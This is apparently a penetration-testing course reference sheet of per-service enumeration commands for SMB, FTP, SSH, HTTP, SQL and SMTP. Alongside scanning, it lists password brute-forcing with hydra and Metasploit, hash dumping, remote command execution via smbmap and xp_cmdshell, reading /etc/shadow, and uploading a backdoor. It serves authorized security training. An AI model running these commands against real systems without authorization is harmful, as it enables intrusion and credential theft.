# Enumeration

> Status: ✅ Reference complete
> Date started: 2026-10-27
> Date finished: 2026-10-27

## 1. Goal
Dig into each discovered service for shares, users, versions, creds and misconfigs. Placeholders: `<TARGET_IP>`, `<USER>`, `<PW>`, `<USERS_LIST>`. Brute-force is intrusive — scope + approval only.

## SMB (139/445)
```bash
# nmap scripts
sudo nmap -p 445 -sV -sC -O <TARGET_IP>
nmap -sU --top-ports 25 --open <TARGET_IP>
nmap -p 445 --script smb-protocols <TARGET_IP>
nmap -p 445 --script smb-security-mode <TARGET_IP>
nmap -p 445 --script smb-enum-sessions --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-users --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-server-stats --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-domains --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-groups --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-services --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=<USER>,smbpassword=<PW> <TARGET_IP>
nmap -p 445 --script smb-os-discovery <TARGET_IP>
nmap -p445 --script=smb-vuln-* <TARGET_IP>

nmblookup -A <TARGET_IP>

# smbmap
smbmap -u guest -p "" -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'          # run a command
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -L                      # list drives
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -r 'C$'                 # list dir
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --upload '/root/backdoor' 'C$\backdoor'
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> --download 'C$\flag.txt'

# smbclient
smbclient -L <TARGET_IP> -N                  # null session list
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/<share> -U <USER>    # then: help / ls / get <file>
smbclient //<TARGET_IP>/public -N

# rpcclient
rpcclient -U "" -N <TARGET_IP>               # then: enumdomusers / enumdomgroups / lookupnames admin

# enum4linux
enum4linux -o <TARGET_IP>                    # OS  (-U users / -S shares / -G groups / -i printers)
enum4linux -a -u "<USER>" -p "<PW>" <TARGET_IP>
enum4linux -U -M -S -P -G <TARGET_IP>

# NULL session check → list/connect/download
enum4linux -n <TARGET_IP>                    # look for <20>
smbclient -L WORKGROUP -I <TARGET_IP> -N -U ""
smbclient \\\\<TARGET_IP>\\c$ -N -U ""        # then: get file_shared.txt

# brute force
gzip -d /usr/share/wordlists/rockyou.txt.gz
hydra -l admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP> smb

# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP> first)
use auxiliary/scanner/smb/smb_version        # OS + SMB/Samba version
use auxiliary/scanner/smb/smb_enumusers      # local users via SAM RPC
use auxiliary/scanner/smb/smb_enumusers_domain   # set SMBDomain WORKGROUP
use auxiliary/scanner/smb/smb_enumshares     # set ShowFiles true  → readable shares + paths
use auxiliary/scanner/smb/smb_login          # set SMBUser/USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true ; creds → DB
use auxiliary/scanner/smb/smb_security_mode  # signing / security level
use auxiliary/scanner/smb/pipe_auditor       # (smb_enum_pipes) named pipes
use auxiliary/scanner/smb/smb_enum_gpp       # Group Policy Preferences (cpassword creds)
# smb_login key opts: BLANK_PASSWORDS true · USER_AS_PASS true · DB_ALL_CREDS/USERS/PASS true · BRUTEFORCE_SPEED 0-5
```
Access shares with found creds:
```bash
smbclient -L <TARGET_IP> -U <USER>
smbclient //<TARGET_IP>/public -U "<USER>%<PW>" -c "ls; get flag.txt; quit"
smbclient "//<TARGET_IP>/<share>" -U "<USER>%<PW>" -c "prompt; recurse; mget *" -D /tmp/smb/
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP> --delete '<share>$\file'   # delete
rpcclient -U "" -N <TARGET_IP>   # then: srvinfo (OS) / enumdomusers / enumdomgroups / lookupnames <USER> (→ SID)
enum4linux -r -u "<USER>" -p "<PW>" <TARGET_IP>   # RID cycling
# Windows-side mount with creds:
net use Z: \\<TARGET_IP>\<share>$ <PW> /user:<USER>   ;   net use Z: /delete
```

## FTP (21)
```bash
sudo nmap -p 21 -sV -sC -O <TARGET_IP>
nmap -p 21 --script ftp-anon <TARGET_IP>
nmap -p 21 --script ftp-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
ftp <TARGET_IP>                              # ls / cd / get <file> / put ; binary for non-text
hydra -L common_users.txt -P unix_passwords.txt <TARGET_IP> -t 4 ftp
# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP>)
use auxiliary/scanner/ftp/ftp_version        # banner, e.g. "220 (vsFTPd 2.3.4)" → search vsftpd
use auxiliary/scanner/ftp/anonymous          # anonymous login allowed?
use auxiliary/scanner/ftp/ftp_login          # set USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true ; THREADS
#   opts: USER_AS_PASS true · BLANK_PASSWORDS true · BRUTEFORCE_SPEED 0-5 · FTPUSER/FTPPASS
```
vsFTPd 2.3.4 → `use exploit/unix/ftp/vsftpd_234_backdoor` (see module 05/08). Loot files, then test creds on other services (reuse).

## SSH (22)
```bash
sudo nmap -p 22 -sV -sC -O <TARGET_IP>
nmap -p 22 --script ssh2-enum-algos <TARGET_IP>
nmap -p 22 --script ssh-hostkey --script-args ssh_hostkey=full <TARGET_IP>
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<USER>" <TARGET_IP>
nmap -p 22 --script=ssh-run --script-args="ssh-run.cmd=cat /home/student/FLAG, ssh-run.username=<USER>, ssh-run.password=<PW>" <TARGET_IP>
nmap -p 22 --script=ssh-brute --script-args userdb=<USERS_LIST> <TARGET_IP>
ssh <USER>@<TARGET_IP>
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <TARGET_IP> ssh
# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP>)
use auxiliary/scanner/ssh/ssh_version            # e.g. SSH-2.0-OpenSSH_7.9p1
use auxiliary/scanner/ssh/ssh_enumusers          # time-based user enum ; set USER_FILE ; CHECK_FALSE true
use auxiliary/scanner/ssh/ssh_login              # set USERNAME/USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true
#   a successful ssh_login OPENS A SESSION → sessions -i 1  (opts: USER_AS_PASS / BLANK_PASSWORDS / BRUTEFORCE_SPEED 0-5)
use auxiliary/scanner/ssh/ssh_identify_pubkeys   # which keys a user accepts (set USER_FILE / KEY_FILE)
```
After access: `whoami; id; sudo -l; cat /etc/passwd; uname -a` → privesc (SUID `find / -perm -4000`, cron) — see module 05. Test creds elsewhere (reuse).

## HTTP (80/443)
```bash
sudo nmap -p 80 -sV -O <TARGET_IP>
nmap -p 80 --script=http-enum -sV <TARGET_IP>
nmap -p 80 --script=http-headers -sV <TARGET_IP>
nmap -p 80 --script=http-methods --script-args http-methods.url-path=/webdav/ <TARGET_IP>
nmap -p 80 --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ <TARGET_IP>
whatweb <TARGET_IP> ; curl -I http://<TARGET_IP>/<DIR> ; lynx <TARGET_IP>
dirb http://<TARGET_IP>
# brute HTTP auth forms:
hydra -L users.txt -P rockyou.txt example.com http-head /admin/     # basic auth
hydra -L users.txt -P rockyou.txt example.com http-get /admin/      # digest
hydra -l admin -P rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
# metasploit auxiliary workflow (setg RHOSTS <TARGET_IP> ; for HTTPS set RPORT 443 + SSL true)
use auxiliary/scanner/http/http_version      # server/version  (opts: SSL, VHOST, Proxies)
use auxiliary/scanner/http/http_header       # headers incl X-Powered-By ; set IGN_HEADER '' ; METHOD HEAD|GET
use auxiliary/scanner/http/robots_txt        # disallowed dirs
use auxiliary/scanner/http/dir_scanner       # set DICTIONARY <wordlist> ; THREADS 20   (status per dir)
use auxiliary/scanner/http/files_dir         # set EXTensions php,html,txt ; DICTIONARY
use auxiliary/scanner/http/backup_file       # set EXTensions bak,old,backup,tmp
use auxiliary/scanner/http/http_methods      # allowed verbs (PUT/DELETE/OPTIONS)
use auxiliary/scanner/http/http_login        # set AUTH_URI /secure/ ; USER_FILE + PASS_FILE ; STOP_ON_SUCCESS true
use auxiliary/scanner/http/apache_userdir_enum   # set USER_FILE  → ~user dirs
```
`401` on a discovered dir = HTTP auth → `http_login` with `AUTH_URI`. Verify dirs manually: `curl -I http://<TARGET_IP>/secure/` (200/401/403). Check `/robots.txt /.htaccess /web.config /phpinfo.php`.

## SQL (MySQL 3306 / MSSQL 1433)
```bash
sudo nmap -p 3306 -sV -O <TARGET_IP>
nmap -p 3306 --script=mysql-empty-password|mysql-info <TARGET_IP>
nmap -p 3306 --script=mysql-users|mysql-databases|mysql-variables --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-query --script-args="query='select ...',username='<USER>',password='<PW>'" <TARGET_IP>
# MSSQL
nmap -sV -sC -p 1433 <TARGET_IP>
nmap -p 1433 --script ms-sql-info|ms-sql-ntlm-info|ms-sql-empty-password <TARGET_IP>
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
# client
mysql -h <TARGET_IP> -u root                 # show databases; use <db>; select load_file("/etc/shadow");
hydra -l <USER> -P unix_passwords.txt <TARGET_IP> mysql
use auxiliary/scanner/mysql/mysql_login|mysql_hashdump|mysql_schemadump
use auxiliary/scanner/mssql/mssql_login ; use auxiliary/admin/mssql/mssql_exec   # set CMD <cmd>
use auxiliary/admin/mssql/mssql_enum ; use auxiliary/admin/mssql/mssql_enum_sql_logins
use auxiliary/admin/mssql/mssql_enum_domain_accounts
# MSSQL nmap: ms-sql-info|ms-sql-ntlm-info|ms-sql-empty-password|ms-sql-brute|ms-sql-dump-hashes|ms-sql-xp-cmdshell
# handy query:  SELECT * FROM master..syslogins
```
MySQL metasploit auxiliary workflow (setg RHOSTS):
```text
use auxiliary/scanner/mysql/mysql_version    # e.g. 5.5.61
use auxiliary/scanner/mysql/mysql_login      # set USERNAME root + PASS_FILE ; STOP_ON_SUCCESS true  (opts: USER_AS_PASS/BLANK_PASSWORDS/BRUTEFORCE_SPEED)
# with creds (set USERNAME + PASSWORD on each):
use auxiliary/admin/mysql/mysql_enum         # version, users, password hashes, privileges (GRANT/FILE/SUPER)
use auxiliary/scanner/mysql/mysql_hashdump   # dump user hashes → crack
use auxiliary/admin/mysql/mysql_schemadump   # whole schema → loot
use auxiliary/admin/mysql/mysql_sql          # set SQL "show databases;" / run arbitrary SQL
use auxiliary/admin/mysql/mysql_file_enum    # read files if FILE priv
```
Manual client + privesc checks:
```sql
mysql -h <TARGET_IP> -u root -p
SHOW DATABASES; SHOW GRANTS; SELECT user,host,authentication_string FROM mysql.user;
SELECT @@secure_file_priv;  SELECT file_priv FROM mysql.user WHERE user='root';   -- FILE priv → read/write files
```

## SMTP (25)
```bash
sudo nmap -p 25 -sV -sC -O <TARGET_IP>
nmap -sV -script banner <TARGET_IP>
nc <TARGET_IP> 25 ; telnet <TARGET_IP> 25    # HELO/EHLO attacker.xyz ; then VRFY root / VRFY admin / EXPN admin
smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <TARGET_IP>
# metasploit auxiliary workflow (setg RHOSTS)
use auxiliary/scanner/smtp/smtp_version      # banner, set RPORT 25,465,587
use auxiliary/scanner/smtp/smtp_enum         # set USER_FILE (unix_users.txt) ; UNIXONLY true ; VERBOSE
use auxiliary/scanner/smtp/smtp_relay        # open-relay check
use auxiliary/scanner/smtp/smtp_ntlm_domain  # NTLM domain disclosure (Exchange)
```
Enumerated SMTP users feed straight into SSH/FTP/SMB brute (password reuse / naming convention). Ports: 25 plain, 465 SSL, 587 TLS.

> Flow per service: nmap version+scripts → try null/anon/default creds → enumerate users/shares/DBs → brute only if needed and approved → note every version string for Vulnerability Assessment.
